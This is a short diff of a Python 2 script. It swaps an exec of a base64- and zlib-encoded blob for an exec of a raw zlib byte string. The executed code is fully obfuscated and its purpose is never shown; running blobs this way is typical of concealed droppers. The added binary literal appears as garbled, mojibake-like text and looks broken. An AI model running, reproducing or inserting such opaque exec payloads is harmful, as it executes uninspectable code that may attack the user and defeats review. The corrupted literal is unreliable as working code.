@@ -1,4 +1,4 @@
 #!/usr/bin/python
+#coding=utf-8
 from zlib import*
-from base64 import*
-exec decompress(b64decode("eNpVUk1vozAQvfdXoJzGZGDDR7MbJHrYarWXHlZ72B4QqpxgqCWDLeOohF+/Y6BVS+QM8/me39Ba3QeWDw0Z2RttXXjX+pi5dUq4j9iAGnuU2OGIDmWsh5fG8reyU3Gn/gnrxJS2uHiPWmmbbc5fcXES3yQBvMXPi4H70wnpMKrQZ65GYPHVNNwJJCKdQMX7c8OLDuw6/lEJbiE5Zj9ypm10xEtJfy+ldMLCCMl9whj70gUw+VmNHBx4sCRlrNU2mAI57IzYUXVZDcDDnAblS4ojp2QwSwOwoP4UnRwgYajhgAkSBr6wulpyv4YGWOET9GNFD3Z/wgsdG5GNTlTXgyFf0DEUExSj+uS93uxzyuWUIxvlrA4PTLaBDYQaBTEL+UNK/EHFRhs4EN/thQQIVFWk9UraUx5BiQEUi5IUPzHPvFYJelDPnpzU038XdbkCK+q7ZZe9vo7Cb7QrP/m9dlIP5apsMOENZ5LdAcPzOuRJDuJZNu4VUoYttY7Cbb2Xqx21BRl3FBpvoxP918zuYvU4vnJpdyRtXy48j/nhu1/XEf0Sfj+1SnMXZsxTtQF1qVhMThB32vBtVWO5/EPm5YKN6lzw4QbbB8ibP3IiXSEEg0tbNdd7MJGqoiSaaxaCquYoryNvSNlv5EcZZT4qWFUU836Oknrfe8y+yuvqUPsVmHUFcMPJz8WtFS+9gXB1Cr8ueoCfRz96QfJAD1sgW5F8Ed1ine4XZehLFx4vqX2chGd33JjYXgdg/wHjeCd1"))
+exec decompress("xÚmRK›0¾ï¯@9É˜.¦\r{hUõÒCÕC÷€ÐÊ	kÉ/G›ì¯ïÒìV*È3ß<¿ñ18“aÊxb~wL6µŒÿ³£¾™-:4¨pÄ	UáìÓÄK;êß2DyÞqÔ_v¡J¿ä!*|QTì¥xœ|Üí#Øí…ž€'?ˆ(Q³DC	´Êmõ¹f.d#„–oñ>O­Š2\0õ?Ê«c·Hr¦ñ”J•ÆŽ”EdÊ®¼\‘wÛYyMéêÂf¯ÊŒú‹•…’¡ƒ’—H/Uxb}7êov\0Ö\íËa°ÞáNà$ùŽ\\\rxÒ%O6I¶õ>Æ¯kÂkÂIòšõyÊÊ˜:f!“z’Ôc.64	èÂ;?Ãøö›˜Ñ]³éoÓe+ZZÐŒ—%þ¥\"_ª<w@Ó²¡º–™X7/Ó¸Ó$ÓJÇön\TÎ¶ËÙ/øJ‹ ÍážüPV>ª!>Ã†¡¢¸IÆkàá&@#™¦Ë¥ùY‚›¦g¡ÂŠH6íÜá¶¾ÿ”ö¶Eøþã¨ˆyÅ¨Ç&d¢yŽ’šjdaaø¡JTÁµI×{tÅðS‰PÈÁãÓ¹~\ržëŽ—Üõ,Ý9^÷<	¢óé¼\"äæÁº¦q¼\SœIMW÷Ý}Ÿx÷o¼ÃÏ)7^Ãñ`<ä‹Ò¤=Ñb?¥ôsµTìáj¨–jÉ)‘VãéÆË[9‚Èˆtv'¼/ÂÉûA;*n")
